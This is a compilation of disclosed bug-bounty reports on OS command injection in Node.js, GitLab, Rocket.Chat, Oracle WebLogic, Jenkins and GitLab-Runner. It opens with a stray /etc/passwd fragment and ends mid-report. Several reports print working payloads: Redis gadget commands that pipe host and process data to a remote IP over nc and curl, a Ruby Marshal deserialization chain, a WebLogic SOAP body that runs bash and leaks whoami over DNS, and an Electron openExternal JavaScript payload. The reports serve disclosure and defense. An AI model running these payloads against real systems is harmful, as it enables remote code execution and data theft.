gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
confluence:x:2002:2002::/var/atlassian/application-data/confluence:/bin/bash
]"             />
        <input
```

## Suggested Mitigation/Remediation Actions

---

### [DNS rebinding in --inspect (again) via invalid IP addresses ](https://hackerone.com/reports/1574078)

- **Report ID:** `1574078`
- **Severity:** High
- **Weakness:** OS Command Injection
- **Program:** Node.js
- **Reporter:** @haxatron1
- **Bounty:** - usd
- **Disclosed:** 2023-08-11T16:38:13.629Z
- **CVE(s):** CVE-2022-32212

**Vulnerability Information:**

The IsAllowedHost check in https://github.com/nodejs/node/blob/fdf0a84e826d3a9ec0ce6f5a3f5adc967fe99408/src/inspector_socket.cc#L580 can easily be bypassed because IsIPAddress does not properly check if an IP address is invalid or not. When an invalid IPv4 address is provided (for instance 10.0.2.555 is provided), the browser will make a DNS requests to the DNS server, providing a vector for an attacker-controlled DNS server to perform a rebinding attack and hence access the JSON file containing the WebSocket file.

## Steps To Reproduce:
The steps to reproduce is mostly the same as https://hackerone.com/reports/1069487, but replace localhost6 with 10.0.2.555, I am copying it here for reference.

1. Victim runs node with --inspect option
2. Victim visits attacker's webpage
3. The attacker's webpage redirects to http://10.0.2.555:9229 
4. 10.0.2.555 is not a valid IP address so the browser asks the malicious DNS server and gets <attacker's-IP> with a short TTL.
5. Victim loads webpage http://10.0.2.555:9229 from <attacker's-IP>.
6. The webpage http://10.0.2.555:9229 tries to load http://10.0.2.555:9229/json from attacker's server. 
7. Due to a short TTL, the DNS server will be soon asked again about an entry for “10.0.2.555”. This time, the DNS server responds “127.0.0.1”.
The http://10.0.2.555:9229 website (i.e., the one hosted on <attacker's IP>) will retrieve http://10.0.2.555:9229/json from 127.0.0.1, including webSocketDebuggerUrl. Now, the attacker knows the webSocketDebuggerUrl and can connect to is using WebSocket. Note that WebSocket is not restricted by same-origin-policy. By doing so, they can gain the privileges of the Node.js instance.
8. In https://github.com/nodejs/node/blob/fdf0a84e826d3a9ec0ce6f5a3f5adc967fe99408/src/inspector_socket.cc#L164L175, the debugger does not recognise that 10.0.2.555 is not a valid IP address and so will allow disclosure of /json file.

To confirm this issue, I will just show two things (let me know if this is not enough):
A) That when 10.0.2.555 is keyed into the browser (Firefox used), a DNS resolution request will be made by a browser to a DNS server, (thus, allowing the DNS rebinding vector to occur,
1. Open Wireshark 
2. Add a redirector
````
<?php

header("Location: http://10.0.2.555:9229/json");
````
3: In the browser visit the the redirector
4. In Wireshark, see that DNS resolution request is being made for 10.0.2.555

B) That when 10.0.2.555 is resolved, the browser will send a Host: 10.0.2.555 which the NodeJS debugger accepts and exposes the /json file.
1. Modify /etc/hosts file
````
10.0.2.555      127.0.0.1
````
2. Visit the redirector in A) to get redirected to the /json file.

## Impact: 
Attacker can gain access to the Node.js debugger, which can result in remote code execution.

## References:
https://hackerone.com/reports/1069487
https://nodejs.org/en/docs/guides/debugging-getting-started/

## Recommended Fix
The isIPAddress() check in https://github.com/nodejs/node/blob/fdf0a84e826d3a9ec0ce6f5a3f5adc967fe99408/src/inspector_socket.cc#L164L175 should be more stricter in validation.

## Impact

Attacker can gain access to the Node.js debugger, which can result in remote code execution.

---

### [Jitsi Desktop Client RCE By Interacting with Malicious URL Schemes on Windows](https://hackerone.com/reports/1692603)

- **Report ID:** `1692603`
- **Severity:** High
- **Weakness:** OS Command Injection
- **Program:** 8x8
- **Reporter:** @ex0dus-0x
- **Bounty:** 777 usd
- **Disclosed:** 2023-02-10T08:20:21.583Z
- **CVE(s):** CVE-2022-43550

**Summary (team):**

A command injection vulnerability exists in Jitsi before commit [8aa7be58522f4264078d54752aae5483bfd854b2]( https://github.com/jitsi/jitsi/commit/8aa7be58522f4264078d54752aae5483bfd854b2) when launching browsers on Windows which could allow an attacker to insert an arbitrary URL which opens up the opportunity to remote execution.

We thank @ex0dus-0x  for submitting this report to us.
Ref: CVE-2022-43550

---

### [Insecure use of shell.openExternal() leads to RCE in Rocket.Chat-Desktop](https://hackerone.com/reports/1781102)

- **Report ID:** `1781102`
- **Severity:** High
- **Weakness:** OS Command Injection
- **Program:** Rocket.Chat
- **Reporter:** @sectex
- **Bounty:** - usd
- **Disclosed:** 2022-12-08T20:48:35.537Z
- **CVE(s):** CVE-2022-44567

**Summary (team):**

Rocket.Chat-Desktop passes the parameter url of openInternalVideoChatWindow to shell.openExternal(), which may lead to remote code execution (internalVideoChatWindow.ts#L17). To exploit the vulnerability, the internal video chat window must be disabled or a Mac App Store build must be used (internalVideoChatWindow.ts#L14). The vulnerability may be exploited by an XSS attack because the function openInternalVideoChatWindow is exposed in the Rocket.Chat-Desktop-API.

---

### [RCE via github import](https://hackerone.com/reports/1672388)

- **Report ID:** `1672388`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** GitLab
- **Reporter:** @yvvdwf
- **Bounty:** - usd
- **Disclosed:** 2022-11-16T01:10:35.826Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

While continuing mining on [github import](https://hackerone.com/reports/1665658), I found a vulnerability on gitlab.com allowing to execute remotely arbitrary commands.

Gitlab uses Octokit to get data from github.com. Octokit uses [Sawyer::Resource](https://github.com/lostisland/sawyer/blob/master/lib/sawyer/resource.rb) to represent results.

Sawyer is a crazy class that [converts](https://github.com/lostisland/sawyer/blob/f5f080d5c5260e094069139ffc7c13d0acba4ab5/lib/sawyer/resource.rb#L81) a hash to an object whose methods are based on the hash's key:

```ruby
irb(main):641:0> Sawyer::VERSION
=> "0.8.2"
irb(main):642:0> a = Sawyer::Resource.new( Sawyer::Agent.new(""), to_s: "example", length: 1)
=> 
{:to_s=>"example", :length=>1}
...
irb(main):643:0> a.to_s
=> "example"
irb(main):644:0> a.length
=> 1
```

Gitlab uses directly the responded Sawyer object in few functions, such as, the `id` variable in [this function](https://gitlab.com/gitlab-org/gitlab/-/blob/99f5db917a33ad9466f35918a1da454ed397be8e/lib/gitlab/github_import/parallel_scheduling.rb#L145):

```ruby
      def already_imported?(object)
        id = id_for_already_imported_cache(object)

        Gitlab::Cache::Import::Caching.set_includes?(already_imported_cache_key, id)
      end
```

Normally, `id` should be a number. However when `id` is `{"to_s": {"bytesize": 2, "to_s": "1234REDIS_COMMANDS" }}`, we can inject additional redis commands by using `bytesize` to limit the previous command when it [is constructed](https://github.com/redis/redis-rb/blob/v4.4.0/lib/redis/connection/command_helper.rb#L8) (although the `bytesize` is `2` we need to reserve 4 bytes as 2 additional bytes for CLRF):

```ruby
      def build_command(args)
        command = [nil]

        args.each do |i|
          if i.is_a? Array
            i.each do |j|
              j = j.to_s
              command << "$#{j.bytesize}"
              command << j
            end
          else
            i = i.to_s
            command << "$#{i.bytesize}"
            command << i
          end
        end
```

As we can execute any redis commands, we can escalate to execute any Bash command by using an existing gadget, for example:

```
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| (hostname; ps aux)  | nc 51.75.74.52 11211  \').read\"],"queue\":\"system_hook_push\"}"
```

I tested this redis command first on my own gitlab instance and it worked. 

I then tested on gitlab.com but got nothing. I tried another by replacing basically `nc` by `curl` but no luck:

```
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) | curl 51.75.74.52:11211 -X POST --data-binary @-  ')\"], \"queue\":\"system_hook_push\"}"
```

Although the gadget above works well on my local instance but gitlab SaaS which may be protected somehow or used another redis namespace for Sidekiq, even another redis instance. So I used then the basic redis command `REPLICAOF 51.75.74.52 11211\n\n` to test gitlab.com and I got a ping from your redis server to my server `nc -vlkp 11211`:

{F1871024}

This means that I have the full control on the redis. After seeing the pings, I immediately turned off the replication by executing the redis command `REPLICAOF no one\n\n`. No information from your redis server has been replicated to mine as I used `nc` and I got only the `ping` messages.


By checking on my local instance at `/var/opt/gitlab/redis/redis.conf`, I see that only `keys` command is disable. I did not try `FLUSHALL` to write data to file as it is too dangerous.

As gitlab uses redis as a cache storage, so I tried to reach RCE via `Marshal.dump` method. I tested the following payload on gitlab.com to poison the avatar of my project via the key `cache:gitlab:avatar:yvvdwf/xss:16210710`:

```
\r\n*3\r\n$3\r\nset\r\n$39\r\ncache:gitlab:avatar:yvvdwf/xss:16210710\r\n$347\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\"\u0006a\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r@git_setI\".(hostname; ps aux) | nc 51.75.74.52 11211\u0006;\fT;\u0012:\fresolve\r\n\r\n
```

Although I did not get RCE but it seems working as I got `500` error code when trying to access to my project. And now I cannot access to my project via web interface. I think I should stop testing to avoid any further potential incidences. I did all the tests above on gitlab.com on 16-17 August 2022 from IP `51.75.74.52`

{F1871025}

# Steps to reproduce

The steps to reproduce should be the same as this [one](https://hackerone.com/reports/1665658)

The following steps are to reproduce on a local gitlab instance whose domain is `http://gitlab.example.com`:

# Step to reproduce

To reproduce, we need the following prerequisite: 

- A VM/machine to host the dummy server  with an public IP though that gitlab.example.com can access to (or you can configure your gitlab instance to allow to access to local networks)
- I created the dummy server using nodejs, so you need to have also nodejs on the machine
- A Gitlab personal access token. Go to http://gitlab.example.com/-/profile/personal_access_tokens?scopes=api to create a new token with within `api` scope.


# Step 1: run the dummy server

- Copy the attachment file on your machine and decompress it to any folder, e.g., `/tmp/dummy-server`
- *Modify the attack payload* as you need inside `redis_command.txt` file, the default value is to execute the command `(hostname; ps aux) > /tmp/ahihi`:
```
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) > /tmp/ahihi ')\"], \"queue\":\"system_hook_push\"}"
```
- Go to `/tmp/dummy-server` then run this command: `node ./index.js YOUR_IP YOUR_PORT` in which, you should replace `IP` and `PORT` with the one you have. For example, `sudo node index.js 51.75.74.52 80`

# Step 2: trigger Gitlab import

- Open a new terminal, then run the following command, in which:

   + `YOUR_IP` and `YOUR_PORT` are the values in the previous step
   + `YOUR_GITLAB_TOKEN` is the api token you've created in the pre-requirement
   + `YOUR_GITLAB_USERNAME` is the target namespace you want to import the project to. It can be your username, or a group name

```bash
curl -kv "http://gitlab.example.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "356289002",
    "target_namespace": "YOUR_GITLAB_USERNAME",
    "new_name": "poc-rce",
    "github_hostname": "http://YOUR_IP:YOUR_PORT"
}'
```

For example:

```bash
curl "http://gitlab.example.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: 3LCvKWXVF-Gadcnbxxxx" \
  --data '{
    "personal_access_token": "xxxxx",
    "repo_id": "356289002",
    "target_namespace": "root",
    "new_name": "NEW-NAME-'$(date +%s)'",
    "github_hostname": "http://ns.yvvdwf.me:80"
}'
```

- View the result in `/etc/ahihi`

## Impact

Any one the the ability to call `api/v4/import/github` endpoint could achieve RCE via a specially crafted responses

---

### [Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE](https://hackerone.com/reports/924151)

- **Report ID:** `924151`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Rocket.Chat
- **Reporter:** @baltpeter
- **Bounty:** - usd
- **Disclosed:** 2022-08-01T10:17:37.113Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** The Rocket.Chat Desktop app passes the links users click on to Electron's `shell.openExternal()` function which can lead to remote code execution.

**Description:** The filtering on the URLs passed to `shell.openExternal()` is insufficient. An attacker can craft and send a link that when clicked will cause malicious code from a remote origin to be executed on the user's system. The specific attack presented here has been tested with Xubuntu 20.04, however similar attacks are also possible on other systems, including non-Linux operating systems.

## Releases Affected:

  * Tested with latest release 2.17.10 from https://github.com/RocketChat/Rocket.Chat.Electron/releases
  * Tested with latest commit `4c06582` on the `develop` branch from https://github.com/RocketChat/Rocket.Chat.Electron

## Steps To Reproduce (from initial installation to vulnerability):

  1. Install Rocket.Chat Desktop on Xubuntu 20.04.
  2. Login and join a channel.
  3. Setup a public Samba server (at `attacker.tld` in this example) and create a public share (named `public` here). In this share, publish the following file as `pwn.desktop` and make it executable:
     
     ```ini
    [Desktop Entry]
    Exec=bash -c "(mate-calc &); xmessage \"Hello from Electron.\""
    Type=Application
     ```
  4. From another account in the same channel, send the following message with the corresponding values replaced: `smb://attacker.tld/public/pwn.desktop`
  5. Click the link and (if necessary) confirm starting the untrusted launcher.
  6. Notice the calculator and message box appearing, confirming remote code execution.

## Supporting Material/References:

  * I have attached a video of the attack to the report.

## Suggested mitigation

  * The problem is in the filter for local file paths in the preload scripts that sets up the link handler here: https://github.com/RocketChat/Rocket.Chat.Electron/blob/4c06582ba3021fcf10e6230286231d50e26e2723/src/preload/links.js#L24
  * The filter only acts as a blocklist, filtering out `file://` links. There are however plenty of other protocols depending on the system, like `smb://` as shown here. Therefore, only an allowlist can successfully prevent attacks here. Usually, allowing `http://`, `https://` and `mailto:` will be enough but you may have different requirements.

Best Regards,  
Benjamin Altpeter  
Technical University of Braunschweig, Germany

## Impact

* The attack can be triggered remotely by an attacker by simply sending a message to a channel.
  * The particular attack presented here requires user interaction. The user has to click the link (which is not obfuscated) and potentially confirm launching the executable. The last part may not be necessary depending on the particular attack vector and system the user runs.
  * This particular presented attack only works on certain Linux distributions. However, this is only due to the particular attack payload used (a Linux `.desktop` file accessed over Samba). Similar payloads will also work on other Linux distributions as well as Windows and macOS. The Electron documentation explicitly warns against using `shell.openExternal()` with untrusted content: https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content
  * If the attack is executed successfully, the attacker can run arbitrary code on the user's system.
  * Patching the problem is simple and doesn't break any legitimate use cases that I can think of.

---

### [Blind User-Agent SQL Injection to Blind Remote OS Command Execution at █████████](https://hackerone.com/reports/1339430)

- **Report ID:** `1339430`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Sony
- **Reporter:** @echidonut
- **Bounty:** - usd
- **Disclosed:** 2022-07-06T17:44:33.923Z
- **CVE(s):** -

**Summary (team):**

The researcher reported that a login form of a Sony website was vulnerable to a blind SQL injection. The researcher was able to use the blind SQL injection to enable xp_cmdshell functionality on the database and then run system commands. The output from the system commands was then obtained via DNS-based exfiltration.

**Summary (researcher):**

https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398

---

### [Reflected XSS and Blind out of band command injection at subdomain dstuid-ww.dst.ibm.com](https://hackerone.com/reports/410334)

- **Report ID:** `410334`
- **Severity:** High
- **Weakness:** OS Command Injection
- **Program:** IBM
- **Reporter:** @vermithor-ke
- **Bounty:** - usd
- **Disclosed:** 2022-02-04T18:23:07.515Z
- **CVE(s):** -

**Vulnerability Information:**

I found an XSS and Blind OS based injection issue due to the incorrect handling of the  characters in THE EMAIL  get& post parameters.  A <script> injected and a sleep command succesfully executed, the following link works as a PoC that alerts the string in the script:
I reproduced the same on Firefox and IE and Microsoft Edge
XSS POC URL:-
GET /cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submit HTTP/1.1
Host: dstuid-ww.dst.ibm.com


https://dstuid-ww.dst.ibm.com/cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submi

OSCOMMAND INJECT

POST /cgi-bin/PasswordCreate.pl HTTP/1.1
Host: dstuid-ww.dst.ibm.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
Referer: https://dstuid-ww.dst.ibm.com/PasswordCreate.html
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

email=-------------------------&ibm-submit=Submit

For the blind os command injection i used three variables:_
1. A random email address (To bench mark the normal responce time
2.  Ping requests  of 10 and 20 seconds 

The reply from the server prooved that the  time-delay inference existed.

See attached videos and images for POC

## Impact

This allows an attacker to inject custom Javascript codes that can be used to steal information from  user base and lure them to malicious websites on the internet on behalf of IBM website.

**Summary (team):**

The discovered XSS and Blind OS based injection issues due to the incorrect handling of the [X] characters were reported to IBM, analyzed and have been remediated. Thank you to our external researcher, smokin-ac3z.

---

### [Exposed Kubernetes API - RCE/Exposed Creds](https://hackerone.com/reports/455645)

- **Report ID:** `455645`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Snapchat
- **Reporter:** @txt3rob
- **Bounty:** 25000 usd
- **Disclosed:** 2021-07-29T22:37:26.838Z
- **CVE(s):** -

**Summary (team):**

@txt3rob found one of Snaps internal Kubernetes instances exposing an API endpoint without authorization to the public. With access to this API he was able to run arbitrary code/jobs as a cluster-admin and gained access to credentials with internal access to a significant number of instances.

**Summary (researcher):**

During a worldwide kubernetes scan with binaryedge.io i found a K8 exposed internal API endpoint without authorization to the public. 

With access to this API I was able to run arbitrary code/jobs as a cluster-admin and gained access to credentials with internal access to a significant number of instances.

---

### [Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-10271]](https://hackerone.com/reports/810755)

- **Report ID:** `810755`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** MTN Group
- **Reporter:** @tounsi_007
- **Bounty:** - usd
- **Disclosed:** 2021-04-25T12:39:51.124Z
- **CVE(s):** CVE-2017-10271

**Vulnerability Information:**

##Summary

Hello. I was able to identify RCE vulnerability due to the outdated Oracle Weblogic instance on `https://raebilling.mtn.co.za`.

##Steps To Reproduce

* To reproduce, launch this request with BurpSuite
* This request to the `https://raebilling.mtn.co.za/wls-wsat/CoordinatorPortType` will trigger sleep for 15 seconds (same applies for 20 secondes, 40 seconds):

```
POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1
Host: raebilling.mtn.co.za
Content-Length: 426
content-type: text/xml
Accept-Encoding: gzip, deflate, compress
Accept: */*

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java class="java.beans.XMLDecoder">
        <object class="java.lang.Thread" method="sleep">
          <long>40000</long>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```
==**POC:**== {F736913} {F736912} {F736915}

## Suggested Mitigation/Remediation Actions
* Patching WebLogic to the recent version will fix the issue.

## Impact

**This vulnerability allow an unauthenticated attacker:**
* To perform Remote OS Command Execution.

**Summary (researcher):**

## CVE-2017-10271 :
>
* Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Security). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server.
>

---

### [Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-3506]](https://hackerone.com/reports/810778)

- **Report ID:** `810778`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** MTN Group
- **Reporter:** @tounsi_007
- **Bounty:** - usd
- **Disclosed:** 2021-04-25T12:37:45.916Z
- **CVE(s):** CVE-2017-3506

**Vulnerability Information:**

##Summary

Hello. I was able to identify RCE vulnerability due to the outdated Oracle Weblogic instance on `https://raebilling.mtn.co.za`.

##Steps To Reproduce

* To reproduce, try this request with BurpSuite 
* This request to the `https://raebilling.mtn.co.za/wls-wsat/RegistrationRequesterPortType` will trigger Remote OS Command Execution:

```
POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1
Host: raebilling.mtn.co.za
Content-Type: text/xml
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0,
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,
Accept-Languag: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3,
Content-Type: text/xml;charset=UTF-8
Content-Length: 873

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
        <void index="2">
                  <string>ping `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
```
==**Note:**== 
* **To reproduce this case with nslookup or ping, `fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net` host should be replaced by your own Burp Collaborator instance or with your private `VPS IP` to catch the DNS request**

##_**Example:**_

``` 
ping `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net
nslookup `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net
```
==**POC:**== {F736973}

## Suggested Mitigation/Remediation Actions
* Patching WebLogic to the recent version will fix the issue.

## Impact

**This vulnerability allow an unauthenticated attacker:**
* To perform Remote OS Command Execution

**Summary (researcher):**

## CVE-2017-3506 :
>
* Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: Web Services). Supported versions that are affected are 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1 and 12.2.1.2. Difficult to exploit vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle WebLogic Server accessible data as well as unauthorized access to critical data or complete access to all Oracle WebLogic Server accessible data.
>

---

### [Unauth RCE on Jenkins Instance at https://█████████/](https://hackerone.com/reports/1125329)

- **Report ID:** `1125329`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @brbsainath
- **Bounty:** - usd
- **Disclosed:** 2021-03-24T20:55:35.664Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
Hi Team,

While Doing Recon on U.s Government Sites, I Found below asset Belongs to U.S Government (Please Check its SSL certificate to confirm or Please check attached  POC Video)
 █████████

https://███/

Attacker can execute Command Injection without Authentication.

## Impact

Unauth RCE

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Navigate to https://███████/_script
2. Please execute below commands to confirm Unauth RCE.

             Commands:  println "ls".execute().text
                                         println "whoami".execute().text
#POC

Please check Attached POC Video to follow steps (If Required)

██████

## Suggested Mitigation/Remediation Actions

---

### [XSS leads to RCE on the RocketChat desktop client.](https://hackerone.com/reports/899964)

- **Report ID:** `899964`
- **Severity:** Critical
- **Weakness:** OS Command Injection
- **Program:** Rocket.Chat
- **Reporter:** @fabianfreyer
- **Bounty:** - usd
- **Disclosed:** 2021-01-01T14:15:11.203Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** It is possible to call `electron.shell.openExternal` from javascript inside a server webview.

**Description:** The document `onclick` handler allows executing `electron.shell.openExternal` by crafting an attacker-controlled link and dispatching a `click` event on it after overwriting `Regex.test`.

## Releases Affected:

  * Rocket.Chat Desktop Client up to version 2.17.9

## Steps To Reproduce (from initial installation to vulnerability):

  1. Have a XSS vulnerability such as #894462 or #899954.
  2. Call the following payload (for macos, adjust for other OSes as required):

```js
(function() {
    const payload = `file:///System/Applications/Calculator.app`;
    var counter = 0;
    var target = document.createElement(`a`);
    target.setAttribute(`href`, payload);
    document.body.appendChild(target);
    var old_test = RegExp.prototype.test;
    RegExp.prototype.test = function (s) {
        if (s === payload) {
            return (++counter > 3);
        }
        return old_test.call(this, s);
    };
    target.dispatchEvent(new Event(`click`));
})();
```

  3. Browse to a page with the XSS payload.
  4. Use your freshly opened calculator to calculate the result of 7*191.

## Impact

An attacker with a XSS vulnerability in RocketChat such as #894462 or #899954 can call `electron.shell.openExternal` with arbitrary URLs, leading to arbitrary command execution.

---

### [GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection](https://hackerone.com/reports/955016)

- **Report ID:** `955016`
- **Severity:** High
- **Weakness:** OS Command Injection
- **Program:** GitLab
- **Reporter:** @ajxchapman
- **Bounty:** - usd
- **Disclosed:** 2020-11-04T08:35:20.727Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

GitLab-Runner, when running on Windows with a `docker` executor, is vulnerable to Command Injection via the `DOCKER_AUTH_CONFIG` build variable. Injected commands are executed on the container host, not within a Docker container, as such could compromise all future builds which are executed by the runner.

## Details

When using a `docker` executor, the `DOCKER_AUTH_CONFIG` build variable is processed as a JSON docker config file. One of the possible config values, `credHelpers`, specifies a hash of repository keys to docker Credential Helper application values. 

```json
{
  "credHelpers" : {
    "repo.example.com" : "application"
  }
}
```

When `gitlab-runner` attempts to create an image, each key value pair in the `credHelpers` hash is processed, and the corresponding Credential Helper application is executed by `gitlab-runner` in order to obtain credentials for the repository. This execution occurs on the docker container host, `gitlab-runner` directly `exec`s the Credential Helper to receive it's output.

Docker Credential Helpers, as processed by the `github.com/docker/cli/cli/config/credentials/native_store.go:NewNativeStore` function are prepended with the string `docker-credential-` before execution:

```go
// github.com/docker/cli/cli/config/credentials/native_store.go
const (
	remoteCredentialsPrefix = "docker-credential-"
	tokenUsername           = "<token>"
)

...

func NewNativeStore(file store, helperSuffix string) Store {
	name := remoteCredentialsPrefix + helperSuffix
	return &nativeStore{
		programFunc: client.NewShellProgramFunc(name),
		fileStore:   NewFileStore(file),
	}
}
```

This is sufficient to prevent command injection on *nix based systems, however Windows based systems can exploit path traversal to execute arbitrary programs as Credential Helpers. E.G. a `credHelper` of `{"helper" : :/../../../../../../../../Windows/System32/calc.exe"}` would result in the application `docker-credential-/../../../../../../../../Windows/System32/calc.exe` being executed, which on a Windows system would resolve to `C:/Windows/System32/calc.exe`. This only affects Windows based systems, as Windows does not verify path directories exist during path normalization. In this case, Windows does not check the directory `docker-credential-` exists as it is normalized out due to the path traversal characters following it.

The Credential Helper execution is ultimately called in the `gitlab-runner` code by `gitlab.com/gitlab-org/gitlab-runner/helpers/docker/auth/auth.go:readConfigsFromCredentialsHelper` calling the `github.com/docker/cli/cli/config/credentials/native_store.go:Get` `docker` API method:

```go
// gitlab.com/gitlab-org/gitlab-runner/helpers/docker/auth/auth.go
func readConfigsFromCredentialsHelper(config *configfile.ConfigFile) (map[string]types.AuthConfig, error) {
	helpersAuths := make(map[string]types.AuthConfig)

	for registry, helper := range config.CredentialHelpers {
		store := credentials.NewNativeStore(config, helper)

		newAuths, err := store.Get(registry)
```

The issue exists as the `gitlab-runner` code does not check for path traversals in Credential Helper values before passing them to the `docker` API.

In it's simplest form, this issue can be exploited to execute any program that exists on the system running `gitlab-runner` with uncontrolled arguments. However, arbitrary programs can be executed by setting up a `service` which downloads an executable payload to the `C:\Builds` volume mounted directory, and setting the full path to the volume mounted directory as the `credHelper` value, e.g.:
```json
{
  "helper" : "/../../../../../../../../ProgramData/docker/volumes/runner-aapjznsw-project-20444930-concurrent-0-cache-cde2929a41401004cf47d36bdb2eb380/_data/testfile.exe"
}
```

This works as the following three conditions are met:
1. The source of the volume mounted `build` directory is predictable per build
1. The `DOCKER_AUTH_CONFIG` is processed once for each created container
1. The build container is created after all `service` containers have been started.

## Steps to reproduce

* Register and run a runner on a Windows system with a docker executor and a tag of `windows-docker-runner`.
* Create a Build with the following `.gitlab-ci.yml`:

```yml
services:
  - alpasdfasdfasdfasdfasdfidne:3.5
variables:
  DOCKER_AUTH_CONFIG: "{\"credHelpers\" : {\"repo.example.com\" : \"/../../../../../../../../Windows/System32/calc.exe\"}}"

build1:
  tags:
    - windows-docker-runner
  stage: build
  script:
    - whoami
```

When `gitlab-runner` picks up the build it will process the `DOCKER_AUTH_CONFIG` json and launch the CredentialHelper specified, in this case `calc.exe`.

Confirmed vulnerable version configurations are:
* gitlab-runner 13.2.2 on Windows 10 with Docker Toolbox (`docker` runner)
* gitlab-runner 13.2.2 on Windows 2019 with Docker Enterprise (`docker-windows` runner)

## Impact

Exploitation of this issue could compromise the underlying system on which `gitlab-runner` runs, exposing source code, build artifacts and other sensitive data to a malicious user.

## What is the current *bug* behavior?

gitlab-runner passes unsanitized JSON values from the `DOCKER_AUTH_CONFIG` build variable to the `github.com/docker/cli/cli/config/credentials/native_store.go:NewNativeStore` `docker` API function, which may result in command injection on Windows systems.

## What is the expected *correct* behavior?

